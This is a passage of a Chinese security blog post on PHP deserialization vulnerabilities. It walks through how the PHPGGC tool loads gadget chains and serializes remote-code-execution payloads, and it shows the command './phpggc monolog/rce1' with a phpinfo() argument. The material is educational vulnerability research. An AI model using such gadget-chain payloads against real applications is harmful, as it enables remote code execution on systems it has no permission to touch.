+<p>还记的去年爆出了一个<a href="https://bugs.php.net/bug.php?id=72433" target="_blank" rel="noopener">PHP GC算法和反序列化机制释放后重用漏洞</a>，是垃圾回收机制本身所出现的问题，在释放与重用的过程中存在的问题。</p>
+<p>顺着这个思路，大家可以继续在对象创建、对象执行、对象销毁方面进行深入的研究。</p>
+<h1 id="0x06-PHPggc"><a href="#0x06-PHPggc" class="headerlink" title="0x06 PHPggc"></a>0x06 PHPggc</h1><p>在0x04的第二节中，我们提到了cms在引用某些依赖库时，可能存在（反）序列化漏洞。那么是否有工具可以生成这些通用型漏洞的测试向量呢？</p>
+<p>当然是存在的。在github上我们找到了<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPggc</a>这个工具，它可以快速的生成主流框架的序列化测试向量。</p>
+<h2 id="关于该测试框架的一点简单的分析"><a href="#关于该测试框架的一点简单的分析" class="headerlink" title="关于该测试框架的一点简单的分析"></a>关于该测试框架的一点简单的分析</h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1. 目录结构"></a>1. 目录结构</h3><p>目录结构为下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|- phpggc </span><br><span class="line">|-- gadgetchains    // 相应框架存在漏洞的类以及漏洞利用代码</span><br><span class="line">|-- lib             // 框架调度及核心代码</span><br><span class="line">|-- phpggc          // 入口</span><br><span class="line">|-- README.md</span><br></pre></td></tr></table></figure>
+<h3 id="2-框架运行流程"><a href="#2-框架运行流程" class="headerlink" title="2. 框架运行流程"></a>2. 框架运行流程</h3><p>首先，入口文件为<code>phpggc</code>，直接跟进<code>lib/PHPGGC.php</code>框架核心文件。</p>
+<p>在<code>__construct</code>中完成了当前文件完整路径的获取，以及定义自动加载函数，以实现对于下面的类的实例化操作。</p>
+<p>关键的操作为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;gadgets = <span class="keyword">$this</span>-&gt;get_gadget_chains();</span><br></pre></td></tr></table></figure>
+<p>可以跟进代码看一看，其完成了对于所有payload的加载及保存，将所有的payload进行实例化，并保存在一个全局数组中，以方便调用。</p>
+<p>可以动态跟进，看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chains</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;include_gadget_chains();</span><br><span class="line"></span><br><span class="line">        $classes = get_declared_classes();</span><br><span class="line">        $classes = array_filter($classes, <span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> is_subclass_of($class, <span class="string">'\\PHPGGC\\GadgetChain'</span>) &amp;&amp;</span><br><span class="line">                   strpos($class, <span class="string">'GadgetChain\\'</span>) === <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        $objects = array_map(<span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $class();</span><br><span class="line">        &#125;, $classes);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert backslashes in classes names to forward slashes,</span></span><br><span class="line">        <span class="comment"># so that the command line is easier to use</span></span><br><span class="line">        $classes = array_map(<span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtolower(str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $class));</span><br><span class="line">        &#125;, $classes);</span><br><span class="line">        <span class="keyword">return</span> array_combine($classes, $objects);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>include_gadget_chains</code>方法中看一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">include_gadget_chains</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $base = <span class="keyword">$this</span>-&gt;base . <span class="keyword">self</span>::DIR_GADGETCHAINS;</span><br><span class="line">        $files = glob($base . <span class="string">'/*/*/*/chain.php'</span>);</span><br><span class="line">        array_map(<span class="function"><span class="keyword">function</span> <span class="params">($file)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">include_once</span> $file;</span><br><span class="line">        &#125;, $files);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在这边首先获取到当前路径，之后从根目录将其下子目录中的所有<code>chain.php</code>遍历一下，将其路劲存储到<code>$files</code>数组中。接着将数组中的所有<code>chain.php</code>包含一遍，保证之后的调用。</p>
+<p>回到<code>get_gadget_chains</code>接着向下看，将返回所有已定义类的名字所组成的数组，将其定义为<code>$classes</code>，接着将是<code>PHPGGC\GadgetChain</code>子类的类，全部筛选出来（也就是将所有的payload筛选出来），并将其实例化，在其完成格式化后，返回一个由其名与实例化后的类所组成的键值数组。</p>
+<p>到此，完成了最基本框架加载与类的实例化准备。</p>
+<p>跟着运行流程，看到<code>generate</code>方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $argv;</span><br><span class="line"></span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;parse_cmdline($argv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count($parameters) &lt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;help();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $class = array_shift($parameters);</span><br><span class="line">        $gc = <span class="keyword">$this</span>-&gt;get_gadget_chain($class);</span><br><span class="line"></span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;get_type_parameters($gc, $parameters);</span><br><span class="line">        $generated = <span class="keyword">$this</span>-&gt;serialize($gc, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>($generated . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>代码很简单，一步一步跟着看，首先<code>parse_cmdline</code>完成了对于所选模块及附加参数的解析。</p>
+<p>接下来<code>array_shift</code>完成的操作就是将我们所选的模块从数组中抛出来。</p>
+<p>举个例子，比如我们输入如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./phpggc monolog/rce1 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure>
+<p>当前的<code>$class</code>为<code>monolog/rce1</code>，看到接下来进入了<code>get_gadget_chain</code>方法中，带着我们参数跟进去看。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chain</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $full = strtolower(<span class="string">'GadgetChain/'</span> . $class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($full, array_keys(<span class="keyword">$this</span>-&gt;gadgets)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>(<span class="string">'Unknown gadget chain: '</span> . $class);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;gadgets[$full];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>现在的<code>$full</code>为<code>gadgetchain/monolog/rce1</code>，ok，看一下我们全局存储的具有payload的数组：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14998544938101.jpg" alt=""></p>
+<p>可以很清楚的看到，返回了一个已经实例化完成的<code>GadgetChain\Monolog\RCE1</code>的类。对应的目录则为<code>/gadgetchains/Monolog/RCE/1/chain.php</code></p>
+<p>继续向下，看到将类与参数传入了<code>get_type_parameters</code>，跟进：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">get_type_parameters</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $arguments = $gc-&gt;parameters;</span><br><span class="line"></span><br><span class="line">        $values = @array_combine($arguments, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($values === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;o($gc, <span class="number">2</span>);</span><br><span class="line">            $arguments = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($a)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;'</span> . $a . <span class="string">'&gt;'</span>;</span><br><span class="line">            &#125;, $arguments);</span><br><span class="line">            $message = <span class="string">'Invalid arguments for type "'</span> . $gc-&gt;type . <span class="string">'" '</span> . <span class="string">"\n"</span> .</span><br><span class="line">                       <span class="keyword">$this</span>-&gt;_get_command_line($gc-&gt;get_name(), ...$arguments);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $values;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其完成的操作对你想要执行或者写入的代码进行装配，即<code>code</code>标志位与你输入的RCE代码进行键值匹配。若未填写代码，则返回错误，成功则返回相应的数组以便进行payload的序列化。</p>
+<p>看完了这个模块后，再看我们最后的一个模块：将RCE代码进行序列化，完成payload的生成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $gc-&gt;load_gadgets();</span><br><span class="line"></span><br><span class="line">        $parameters = $gc-&gt;pre_process($parameters);</span><br><span class="line">        $payload = $gc-&gt;generate($parameters);</span><br><span class="line">        $payload = <span class="keyword">$this</span>-&gt;wrap($payload);</span><br><span class="line"></span><br><span class="line">        $serialized = serialize($payload);</span><br><span class="line"></span><br><span class="line">        $serialized = $gc-&gt;post_process($serialized);</span><br><span class="line">        $serialized = <span class="keyword">$this</span>-&gt;apply_filters($serialized);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h1><p>关于PHP（反）序列化漏洞的触发和利用所涉及的东西还有很多，本文只是做一个概括性的描述，抛砖引玉，如有不精确的地方，望大家给予更正。</p>
+<h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h1><ol>
+<li><a href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank" rel="noopener">Practical PHP Object Injection</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="noopener">SugarCRM 6.5.23 - REST PHP Object Injection漏洞分析</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a></li>
+<li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPGGC</a></li>
+<li><a href="http://lucifaer.com/index.php/archives/17/">关于PHP中的自动加载类</a></li>
+<li><a href="http://t.xiaomiquan.com/zJ6Y7Mf" target="_blank" rel="noopener">Phith0n小密圈的主题</a></li>
+</ol>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://lucifaer.com">Lucifaer</a>
+            <p>原文链接: <a href="https://lucifaer.com/2017/07/19/PHP反序列化漏洞/">https://lucifaer.com/2017/07/19/PHP反序列化漏洞/</a>
+            <p>发表日期: <a href="https://lucifaer.com/2017/07/19/PHP反序列化漏洞/">July 19th 2017, 1:57:07 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2017/07/20/Blackhat SEO/" title= Blackhat SEO >
+                    <div class="nextTitle">Blackhat SEO</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2017/05/27/Joomla 框架的简单跟进/" title= Joomla 框架的简单跟进 >
+                    <div class="prevTitle">Joomla 框架的简单跟进</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zODcyOC8xNTI1Ng==>
+        <script type="text/javascript">
+            (function(d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+         
+                if (typeof LivereTower === 'function') { return; }
+         
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+         
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+             </script>
+         <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:l.lucifaer@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Lucifaer" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//weibo.com/5838222069" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-序列化的作用"><span class="toc-number">1.</span> <span class="toc-text">0x00 序列化的作用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-PHP序列化格式"><span class="toc-number">2.</span> <span class="toc-text">0x01 PHP序列化格式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-基础格式"><span class="toc-number">2.1.</span> <span class="toc-text">1. 基础格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-序列化举例"><span class="toc-number">2.2.</span> <span class="toc-text">2. 序列化举例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-注意"><span class="toc-number">2.3.</span> <span class="toc-text">3. 注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-反序列化示例"><span class="toc-number">2.4.</span> <span class="toc-text">4. 反序列化示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-PHP（反）序列化有关的魔法函数"><span class="toc-number">3.</span> <span class="toc-text">0x02 PHP（反）序列化有关的魔法函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-PHP反序列化与POP链"><span class="toc-number">4.</span> <span class="toc-text">0x03 PHP反序列化与POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-魔术方法与POP链"><span class="toc-number">4.1.</span> <span class="toc-text">1. 魔术方法与POP链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-POP链demo"><span class="toc-number">4.2.</span> <span class="toc-text">2. POP链demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Autoloading与（反）序列化威胁"><span class="toc-number">4.3.</span> <span class="toc-text">3. Autoloading与（反）序列化威胁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Composer与Autoloading"><span class="toc-number">4.4.</span> <span class="toc-text">4. Composer与Autoloading</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-反序列化漏洞的挖掘"><span class="toc-number">5.</span> <span class="toc-text">0x04 反序列化漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-概述"><span class="toc-number">5.1.</span> <span class="toc-text">1. 概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-依赖库"><span class="toc-number">5.2.</span> <span class="toc-text">2. 依赖库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">5.2.1.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-寻找可能存在漏洞的应用"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">1. 寻找可能存在漏洞的应用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-寻找可以利用的POP组件"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">2. 寻找可以利用的POP组件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-手动验证，并构建POP链"><span class="toc-number">5.2.1.3.</span> <span class="toc-text">3. 手动验证，并构建POP链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-PHP语言本身漏洞"><span class="toc-number">5.3.</span> <span class="toc-text">3. PHP语言本身漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例子-1"><span class="toc-number">5.3.1.</span> <span class="toc-text">例子</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-拓展思路"><span class="toc-number">6.</span> <span class="toc-text">0x05 拓展思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-抛砖引玉——魔法函数可能造成的威胁"><span class="toc-number">6.1.</span> <span class="toc-text">1. 抛砖引玉——魔法函数可能造成的威胁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">6.1.1.</span> <span class="toc-text">__toString()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#字符串操作"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">字符串操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数组操作"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">数组操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#class-exists"><span class="toc-number">6.1.1.3.</span> <span class="toc-text">class_exists</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-猜想——对象处理过程可能出现的威胁"><span class="toc-number">6.2.</span> <span class="toc-text">2. 猜想——对象处理过程可能出现的威胁</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-PHPggc"><span class="toc-number">7.</span> <span class="toc-text">0x06 PHPggc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#关于该测试框架的一点简单的分析"><span class="toc-number">7.1.</span> <span class="toc-text">关于该测试框架的一点简单的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-目录结构"><span class="toc-number">7.1.1.</span> <span class="toc-text">1. 目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-框架运行流程"><span class="toc-number">7.1.2.</span> <span class="toc-text">2. 框架运行流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-结语"><span class="toc-number">8.</span> <span class="toc-text">0x07 结语</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-参考资料"><span class="toc-number">9.</span> <span class="toc-text">0x08 参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 18
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2018/07/19/薅羊毛产业链分析/" >薅羊毛产业链分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/以太坊简介/" >以太坊简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/比特币简介/" >比特币简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/区块链补充/" >区块链补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2018/06/18/区块链基础概念/" >区块链基础概念</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2018/03/02/部署Django/" >部署Django</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2018/02/28/Git Hooks实现项目的自动部署/" >Git Hooks实现项目的自动部署</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2017/10/09/XDCTF Upload 引发出来的一个新思路/" >XDCTF Upload 引发出来的一个新思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2017/07/20/Blackhat SEO/" >Blackhat SEO</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2017/07/19/PHP反序列化漏洞/" >PHP反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2017/05/27/Joomla 框架的简单跟进/" >Joomla 框架的简单跟进</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2017/05/09/五指CMS任意文件下载漏洞/" >五指CMS任意文件下载漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2017/04/13/Phpcms V9.6.0任意文件写入getshell/" >Phpcms V9.6.0任意文件写入getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/2017/02/06/WordPress REST API 内容注入/" >WordPress REST API 内容注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2017/01/18/SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析/" >SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2016 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2016/08/11/CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞/" >CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/" >IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
